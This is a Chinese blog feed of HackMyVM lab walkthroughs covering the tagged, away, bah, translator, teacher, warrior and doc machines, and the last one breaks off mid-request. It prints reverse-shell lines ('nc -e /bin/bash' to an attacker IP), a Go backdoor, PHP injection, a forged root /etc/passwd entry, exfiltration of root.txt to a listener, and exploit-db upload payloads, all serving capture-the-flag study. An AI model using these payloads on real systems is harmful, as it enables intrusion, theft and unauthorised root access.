<h5 id="第一个点"><a href="#第一个点" class="headerlink" title="第一个点"></a>第一个点</h5><p><strong>借助7746端口配合index.php反弹shell</strong></p>
<p>不知道是些什么东西，在这里就被卡住了，看了题解才明白，<strong>当我们nc连接7746端口时输入的数据会被写入到index.php中</strong>，所以后来再访问index.php会出现很乱的东西，就是nmap扫描的时候留下的记录（而且7746端口被nmap扫描后会关闭，重启靶机就好了），我们自己连接7746端口发送数据验证一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235415.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-21%2023.54.35.png" ></p>
<p>是成功的，其实现在回看可以在最上面看到nmap，如果做的时候能有多一些联想就好了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235555.png" ></p>
<p>接下来就是给7746端口发送php命令反弹shell，再访问index.php，就能接收到了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235737.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235755.png" ></p>
<h5 id="第二个点"><a href="#第二个点" class="headerlink" title="第二个点"></a>第二个点</h5><p><strong>分析代码，顺应逻辑拿到用户的shell</strong></p>
<p>拿到了www-data的shell，在html目录下，有个.go文件，拿给ai分析一下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span>     <span class="comment">// 用于提供读取输入的帮助函数</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>       <span class="comment">// 提供格式化输入输出功能</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span>       <span class="comment">// 提供网络编程功能</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span>        <span class="comment">// 提供操作系统功能</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span>       <span class="comment">// 提供日志功能</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>   <span class="comment">// 用于执行外部命令</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span>   <span class="comment">// 提供字符串处理功能</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 监听TCP连接在7746端口</span></span><br><span class="line">    ln, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:7746&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 接受连接</span></span><br><span class="line">        conn, _ := ln.Accept()</span><br><span class="line">        <span class="comment">// 启动两个并发的goroutine来处理接收和发送数据</span></span><br><span class="line">        <span class="keyword">go</span> receiveData(conn)</span><br><span class="line">        <span class="keyword">go</span> sendData(conn, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发送数据到客户端的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendData</span><span class="params">(conn net.Conn, mensaje <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 将消息发送到连接</span></span><br><span class="line">    fmt.Fprintf(conn, mensaje)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 接收来自客户端的数据并处理的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receiveData</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> tohtml <span class="type">string</span></span><br><span class="line">        <span class="comment">// 发送提示符给客户端</span></span><br><span class="line">        sendData(conn, <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="comment">// 读取客户端发送的消息</span></span><br><span class="line">        message, _ := bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment">// 去除消息末尾的换行符</span></span><br><span class="line">        message = strings.TrimRight(message, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="comment">// 将消息格式化为HTML格式</span></span><br><span class="line">        tohtml = <span class="string">&quot;&lt;pre&gt;&quot;</span> + message + <span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line">        <span class="comment">// 如果收到特定消息，则执行外部命令</span></span><br><span class="line">        OMG := <span class="string">&quot;Deva&quot;</span></span><br><span class="line">        <span class="keyword">if</span> message == OMG &#123;</span><br><span class="line">            cmd := exec.Command(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7777&quot;</span>)</span><br><span class="line">            _ = cmd.Run()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打开文件用于追加，并将HTML消息写入文件</span></span><br><span class="line">        file, err := os.OpenFile(<span class="string">&quot;/var/www/html/index.php&quot;</span>, os.O_APPEND|os.O_WRONLY, <span class="number">0644</span>)</span><br><span class="line">        _, _ = fmt.Fprintln(file, tohtml)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭文件</span></span><br><span class="line">        <span class="keyword">defer</span> file.Close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用一是展示了向7746端口输入信息会被写入到index.php，二是让我们知道，当我们向7746端口发送“Deva”时，靶机会向本地的7777端口反弹一个shell，那么接下来就是给7746端口发送信息，同时在刚拿到的shell开启7777端口监听</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000433.png" ></p>
<p>顺利拿到shyla的账户</p>
<h5 id="第三个点"><a href="#第三个点" class="headerlink" title="第三个点"></a>第三个点</h5><p><strong>借助goaccess给report.php标题写入恶意代码，再免密码执行</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000556.png" ></p>
<p>sudo -l看到有goaccess和report.php（空的）可以利用，查了goaccess的作用，是一个可以实现可视化的web日志分析工具，查看了帮助文档，研究半天没有思路，最后看wp知道以下三个比较可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f --log-file=&lt;filename&gt;        - Path to input log file.</span><br><span class="line">-o --output=file.html|json|csv  - Output either an HTML, JSON or a CSV file.</span><br><span class="line">--html-report-title=&lt;title&gt;     - Set HTML report page title and header.</span><br></pre></td></tr></table></figure>

<p>先随便在当前目录下创建一个a.log，然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>以uma的身份执行goaccess，分析a.log然后把结果写到report.html，标题写入php代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shyla@tagged:~$ <span class="built_in">ls</span></span><br><span class="line">a.log  magiccode  user.txt</span><br><span class="line">shyla@tagged:~$ sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=<span class="string">&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span></span><br><span class="line">shyla@tagged:~$ sudo /usr/bin/php /var/www/html/report.php</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@tagged:/home/shyla<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) grupos=0(root)</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<h3 id="away"><a href="#away" class="headerlink" title="away"></a>away</h3><p>开了80和22端口，访问80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322003701.png" ></p>
<p>给了一个用户名，下面的东西是ED25519密钥生成时产生的界面，大概就是提示和这种类型的密钥有关（整个靶场都和这个有关系）。</p>
<p>拿到了用户名尝试爆破出tula的ssh密码，然而他需要私钥文件登陆，查询了一下ED25519密钥的私钥文件名是id_ed25519，现在就需要找到这个密钥文件，扫目录扫半天扫不出东西，看了wp才知道，直接就放在了网页目录下。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004502.png" ></p>
<p>拿到后保存到本地，有了私钥文件登陆还需要密码（在公钥文件写了）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004638.png" ></p>
<p>成功拿到第一个shell</p>
<p>sudo -l看到可以免密码用lula运行webhook，查看帮助文档</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004921.png" ></p>
<p>需要用到的是 -hooks和-verbosre，需要一个json文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005017.png" ></p>
<p>在github找到了这个项目，中间可以写一个自己的sh文件，我写了一个&#x2F;tmp&#x2F;a.sh，然后编辑.json文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:/tmp$ <span class="built_in">cat</span> a.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 192.168.64.3 8888</span><br><span class="line">tula@away:/tmp$ <span class="built_in">cd</span></span><br><span class="line">tula@away:~$ <span class="built_in">ls</span></span><br><span class="line">hooks.json  user.txt</span><br><span class="line">tula@away:~$ <span class="built_in">cat</span> hooks.json</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cleanup-webhook&quot;</span>,</span><br><span class="line">    <span class="string">&quot;execute-command&quot;</span>: <span class="string">&quot;/tmp/a.sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;command-working-directory&quot;</span>: <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>然后就开启了服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:~$ sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose</span><br><span class="line">[webhook] 2024/03/21 17:54:24 version 2.6.9 starting</span><br><span class="line">[webhook] 2024/03/21 17:54:24 setting up os signal watcher</span><br><span class="line">[webhook] 2024/03/21 17:54:24 attempting to load hooks from hooks.json</span><br><span class="line">[webhook] 2024/03/21 17:54:24 os signal watcher ready</span><br><span class="line">[webhook] 2024/03/21 17:54:24 found 1 hook(s) <span class="keyword">in</span> file</span><br><span class="line">[webhook] 2024/03/21 17:54:24 	loaded: cleanup-webhook</span><br><span class="line">[webhook] 2024/03/21 17:54:24 serving hooks on http://0.0.0.0:9000/hooks/&#123;<span class="built_in">id</span>&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候还没弹到shell，还要访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.64.97:9000/hooks/cleanup-webhook</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005703.png" ></p>
<p>成功拿到lula的shell，搜寻提权方法，用**&#x2F;usr&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null**查到more有read_and_search权限</p>
<p>接下来的思路是利用more读取&#x2F;root&#x2F;.ssh下的私钥文件，依旧是id_ed25519，保存下来ssh登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322010551.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lula@away:/tmp$ ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">Linux away 5.10.0-15-amd64 <span class="comment">#1 SMP Debian 5.10.120-1 (2022-06-09) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Jun 17 11:14:38 2022</span><br><span class="line">root@away:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<h3 id="bah"><a href="#bah" class="headerlink" title="bah"></a>bah</h3><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Bah" >https://hackmyvm.eu/machines/machine.php?vm=Bah<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：192.168.64.105</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到80和3306端口，先看看80，是个qdpm框架，他有一个密码暴露的poc（<a class="link"   href="https://www.exploit-db.com/exploits/50176%EF%BC%89" >https://www.exploit-db.com/exploits/50176）<i class="fas fa-external-link-alt"></i></a></p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105323.png"   style="zoom:50%;" >

<p>访问‘&#x2F;core&#x2F;config&#x2F;databases.yml’，下载到一个yml文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105519.png" ></p>
<p>可以看到账号密码，用来登陆mysql</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105601.png" ></p>
<p>看到hidden数据库比较可疑</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105700.png"   style="zoom:50%;" >

<p>得到一批url和账号密码，先把url都保存成字典，然后fuff一下</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325110024.png"   style="zoom:50%;" >

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -c -r -u http://192.168.64.105 -H &quot;HOST: FUZZ&quot;  -w url.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-25%2011.01.44.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>可以看到party.bah.hmv比较不一样，配置一个hosts文件然后访问，是一个网页版终端，用之前拿到的yml文件里面的账号密码登陆，查看&#x2F;etc&#x2F;passwd，发现有个rocio用户，前面数据库查询中有拿到他的密码，直接切换用户</p>
<p>做了一些常规的搜寻，没找到怎么提权方式，下载一个pspy64看看，发现</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111440.png" ></p>
<p>这是启动 Shell In A Box 服务，重点是最后的“**-s &#x2F;devel:root:root:&#x2F;:&#x2F;tmp&#x2F;dev**”，指定了另一个路径 <code>/devel</code>，访问该路径时会直接以 root 用户身份进入 <code>/tmp/dev</code> 目录，而且是以root执行。</p>
<p>所以思路是我们创建一个&#x2F;tmp&#x2F;dev，然后在网页端访问&#x2F;devel去执行&#x2F;tmp&#x2F;dev</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111819.png" ></p>
<p>接下来就是本地开启监听，然后去访问&#x2F;devel</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111914.png" ></p>
<p>提权成功</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>学习了host的fuzz，最后shellbox的语句，要查阅资料才能读懂，很有趣。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm 复盘合集1</title>
    <url>/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%861/</url>
    <content><![CDATA[<h3 id="translator"><a href="#translator" class="headerlink" title="translator"></a>translator</h3><p>来到80端口看到有个translator的界面，随便输了abc，返回zyx，试了几次确认加密逻辑就是一对一替换，a-z，b-y这样，但是数字和大写字母是不会变的，扫了目录也没看到有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.15.54.png" ></p>
<p>然后看了wp才知道，<strong>这个输入框可以命令注入，要先有个分号隔断，并且要输入的命令要先transalte一下</strong>（有点解谜），比如要使用id命令，就要输入“；rw”</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.22.42.png"   alt="像这样" style="zoom:50%;" >

<p>那就先nc拿到一个shell，主要要先把命令translate一下</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316182706.png"   style="zoom:50%;" >

<p>就拿到第一个shell，我感觉有点脑洞，可能是见识的不够多吧，代码逻辑如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = $_GET[&#x27;hmv&#x27;];</span><br><span class="line">$test = escapeshellcmd($test);// 应该是用来防止命令注入的，输入分号后前面跟了一个\，但是经过下面第一个system斜杆又没了</span><br><span class="line">echo (&quot;Translated to:&quot;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$ultima_linea = system(&#x27;echo &#x27;.$test.&#x27;| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba&#x27;);</span><br><span class="line">$ulti = system(&#x27;echo &#x27;.$ultima_linea.&#x27;| tr &quot;php&quot; &quot;wtf&quot;&#x27;); // 用分号实现命令注入</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后在html目录下有个hvxing文件，打开查看是段字符串，第一反应是拿去网页translate一下</p>
<p>然后就拿到一个密码，到&#x2F;home目录下看到有两个用户，尝试了一下ocean登陆成功</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185134.png"   style="zoom:50%;" >

<p>然后sudo -l看到有choom可以利用，india可以不用密码，gtfobins查询到了提权命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u india /usr/bin/choom -n 0 /bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="第二个flag"><a href="#第二个flag" class="headerlink" title="第二个flag"></a>第二个flag</h4><p>就切换到了india账户，再sudo -l查找，有一个trans可以利用，file看了一下是个是个shell的脚本</p>
<p>cat看了一下内容很多，切换个思路-h看看帮助文档</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185857.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185917.png"   style="zoom:50%;" >

<p>注意到有input file也可以开个http代理，那就尝试结合这两个功能把&#x2F;root&#x2F;root.txt读出来</p>
<p>kali先开个nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo trans -i /root/root.txt -x 192.168.64.3:8888</span><br><span class="line">nc -lvp 8888 &gt; trans</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316190434.png"   style="zoom:50%;" >

<p>得到一个包，尝试了一下url解码q后面的内容，就拿到flag</p>
<h4 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512</span><br></pre></td></tr></table></figure>

<p>先生成一个哈希字符串，然后拼接一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">but:$6$qzFU83LRKpBUmZCQ$qCQiwtXEjJmtTAOO2HRJsneHiliw9k2V2/3EtU64v9tP2eaud5fdtp5pQurFVtEsovQjfbo2j3KY.JmF0QqEL/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>先复制一份原来的&#x2F;etc&#x2F;passwd，在&#x2F;tmp目录下伪造一个一样的最下面在加入我们伪造的字符串，<strong>思路就给靶机多加一个用户，有root权限</strong>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root trans -i www -o /etc/passwd -no-auto</span><br></pre></td></tr></table></figure>

<p>写入之后登陆我们伪造的用户，成功提权到root</p>
<h5 id="小抽象"><a href="#小抽象" class="headerlink" title="小抽象"></a>小抽象</h5><p>就是利用读写功能获取我们想要的东西，也可以对关键文件进行篡改</p>
<h3 id="teacher"><a href="#teacher" class="headerlink" title="teacher"></a>teacher</h3><p>web端扫描目录扫到，access.php,log.php，clearlog.php，看一下log.php，内容说有一个rabbit.jpg，访问之后一张·图片·，最开始用stegseek出了得到一个secret.txt里面写着”rabbithole”，不明所以，尝试登陆ssh也没有用</p>
<p>去到access.jpg，源代码src后面是空的，就联想到有没有可以写入的参数，fuzz了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200751.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -u &#x27;http://192.168.64.77/access.php?FUZZ=rabbit.jpg&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=12</span><br></pre></td></tr></table></figure>

<p>果然得到了一个参数‘id’，然后看到了图片</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200944.png" ></p>
<p>再看看这时的源码，然后就联想到命令注入，先闭合单引号，在写入命令试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201116.png" ></p>
<p>经过一番探索（结合wp），发现可以直接注入php语句，还要配合前面的log.php，因为access.php不会执行，log.php记录了这些并且会执行，例如：</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201809.png" ></p>
<p>发现了利用点，那就拿到第一个shell了，在html目录下发现有个pdf，下载查看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202025.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202055.png" ></p>
<p>虽然密码被糊住了，但是可以在前面找到自己，反向写出来就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pass = ThankYouTeachers</span><br></pre></td></tr></table></figure>

<p>然后就登陆了mrteacher账户，成功拿到userflag</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>Sudo -l 看到有gedit和xauth可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth</span><br></pre></td></tr></table></figure>

<p>查了一下，<strong>xauth命令</strong> 用于显示和编辑被用于连接X服务器的认证信息。<strong>gedit</strong>是个文本编辑器</p>
<p><strong>思路就是利用gedit查看或修改root.txt（或其他任意文件），在这之前要先利用xauth增加一个认证，并且ssh登陆账号要加-x让SSH 客户端会在连接过程中启用 X11 转发。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh -X mrteacher@192.168.64.77</span><br><span class="line">mrteacher@192.168.64.77&#x27;s password: </span><br><span class="line">Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Mar 16 13:25:36 2024 from 192.168.64.3</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth list  列出当前用户的 X 认证信息</span><br><span class="line">Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">向授权文件中添加一个 MIT-MAGIC-COOKIE-1 权限</span><br></pre></td></tr></table></figure>

<p>增加权限后就使用gedit了，这个时候可以直接读取rootflag，也可以修改&#x2F;etc&#x2F;passwd增加一个用户提权（像上一个靶机一样），两种思路都可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /root/root</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>web端命令注入结合日志文件，提权方面两个可利用点的结合，伪造用户或读取文件。</p>
<h3 id="warrior"><a href="#warrior" class="headerlink" title="warrior"></a>warrior</h3><p>web端扫到robots.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014210.png" ></p>
<p>User.txt里面有个名字‘loco’我还想过爆破ssh，没有结果，secret.txt一个字符串看起来不是密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014232.png" ></p>
<p>internal.php说要把MAC地址改成00:00:00:00:00:a? 最后一个问号还要一个一个试，网上找教程修改kali都mac地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 down</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 hw ether 00:00:00:00:00:af //最后试出来是af</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 up                        </span><br><span class="line">                                  </span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317011739.png" ></p>
<p>然后再访问，就得到了密码，我尝试了loco作为用户名居然无效，最后看了wp才知道还有一个用户名可以是bro（扶额苦笑），然后顺利登陆，想输入sudo回显没有这个命令，路径没设置好，要调用应该在&#x2F;usr&#x2F;sbin&#x2F;sudo，查到有个task可以利用，找了提权语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/sudo /usr/bin/task execute /bin/sh</span><br></pre></td></tr></table></figure>

<p>顺利拿到root</p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>这个靶机的点主要在切换mac地址，还要尝试出来最后一位是f，bro这个也难想，以后要多考虑可以用cewl生成字典，提权比较简单。</p>
<h3 id="doc"><a href="#doc" class="headerlink" title="doc"></a>doc</h3><h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>难度：easy</p>
<p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Doc" >https://hackmyvm.eu/machines/machine.php?vm=Doc<i class="fas fa-external-link-alt"></i></a></p>
<p>ip地址：192.168.64.104</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>开了80端口和3306端口，先看看80端口，一打开就看到login选项，点击后发现要配置hosts文件，配置为doc.hmv，然后面对登陆框，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325100855.png" ></p>
<p>可以看到用了一个OTOMS的框架，有找到相关版本的漏洞，但要先登陆，随便输入点再抓个包，sqlmap测一下，是可以注入的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101135.png" ></p>
<p>爆出两个数据库，再仔细看看里面的内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101328.png" ></p>
<p>找到账号密码，登陆到后台，找到漏洞库（<a class="link"   href="https://www.exploit-db.com/exploits/50389%EF%BC%89%E8%AF%B4%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%AA%E4%BA%BA%E5%A4%B4%E5%83%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E5%85%88%E6%8A%93%E4%B8%AA%E5%8C%85" >https://www.exploit-db.com/exploits/50389）说的漏洞点，也就是个人头像修改文件上传，先抓个包<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101948.png" ></p>
<p>然后按照poc发送包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /classes/Users.php?f=save HTTP/1.1</span><br><span class="line">Host: doc.hmv</span><br><span class="line">Content-Length: 1018</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Origin: http://doc.hmv</span><br><span class="line">Referer: http://doc.hmv/admin/?page=user</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: 